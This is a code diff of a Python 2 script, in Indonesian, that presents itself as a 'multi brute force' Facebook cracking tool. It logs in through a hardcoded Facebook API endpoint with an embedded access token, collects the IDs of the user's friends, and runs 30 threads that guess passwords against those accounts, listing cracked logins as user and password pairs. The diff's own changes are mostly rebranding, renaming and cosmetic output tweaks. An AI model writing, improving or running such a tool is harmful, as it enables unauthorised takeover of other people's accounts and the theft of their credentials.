@@ -1,3 +1,6 @@
+# Created by Iqbal Dev
+# Tools Multi Brute Force Facebook Ringan
+
 import os 
 import sys
 import time
@@ -54,9 +57,9 @@ def banner():
     
      \rw+==============================+
      \ra|       MULTI BRUTE FORCE      |
-     \rw+==============================+
-           \rwThanks to \raIvana Raa/
+     \rw+==============================+          
            \rwCreated by \raIqbal Dev
+           \rwThanks to \raIvana Raa/
         \rd==========================''')
 
 def logout():
@@ -64,7 +67,7 @@ def logout():
     try:
         print k+" ["+pu+"1"+k+"]"+a+" Keluar Dari Program.."
         print k+" ["+pu+"2"+k+"]"+a+" Keluar Dari Akun Facebook.."
-        iqbal = raw_input(h+" Pilih Salah Satu Bro.. "+a+"[1/2]: ")
+        iqbal = raw_input(p+" [?]"+h+" Pilih Salah Satu.. "+a+"[ 1 / 2 ]: ")
         if iqbal == "1":
             print d+" Keluar Dari Program.."
         elif iqbal == "2":
@@ -88,17 +91,17 @@ def login():
     except IOError, KeyError:
         
         banner()
-        user_name = raw_input(p+"  [log]" + a + " Username" + k + ": ")
-        password = raw_input(p+"  [log]" + a + " Password" + k + ": ")
+        user_name = raw_input(p+"  [log]" + a + " Username" + d + ": ")
+        password = raw_input(p+"  [log]" + a + " Password" + d + ": ")
         req = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
     
         dev = req.content
         jsl = json.loads(dev)
         if "session_key" in dev:
             print
-            run (h+" Berhasil Login"+ pu +".........")
+            run (h+" Berhasil Login\033[97m........")
             open("token.txt", "w").write(jsl["access_token"])
-            run (h+" Login Sukses" +pu+".........")
+            run (h+" Login Sukses\033[97m........")
             print
             id_teman()
         elif "error_msg" in dev:
@@ -112,6 +115,11 @@ def login():
             print m+ " Gagal Login..."
             print
             sys.exit()
+
+    except KeyboardInterrupt:
+        print
+        print d+" Keluar Dari Program.."
+
 
 def id_teman():
     try:
@@ -165,7 +173,7 @@ def mbf():
             try:
                 listID = open('id.txt', "r")
                 for ival in range(30):
-                    iqbal = threading.Thread(target=mbfcrack, args=())
+                    iqbal = threading.Thread(target=iqbaldevmbf, args=())
                     iqbal.start()
                     threads.append(iqbal)
 
@@ -181,7 +189,7 @@ def mbf():
             print d+ " Keluar Dari Program"
             sys.exit()
             
-def mbfcrack():
+def iqbaldevmbf():
     
     global count, dados, gagal, oradadi, baris
     
@@ -195,7 +203,7 @@ def mbfcrack():
             jsl = json.load(Iq_data)
             if count == len(baris):
                 break
-            if "access_token" in jsl:
+            elif "access_token" in jsl:
                 dados.append(h+" [OK] " + pu + user + " | " + a + password)
                 count += 1
                 
@@ -207,7 +215,7 @@ def mbfcrack():
                 oradadi.append(user)
                 count += 1
         
-            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]")
+            sys.stdout.write(pu+ "\r [$]" + a + " Cracking " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " [ " + h + str(len(dados)) + pu + " / " + k + str(len(gagal)) + m + " ]" + h + "Semoga beruntung :)")
             sys.stdout.flush()
         
 
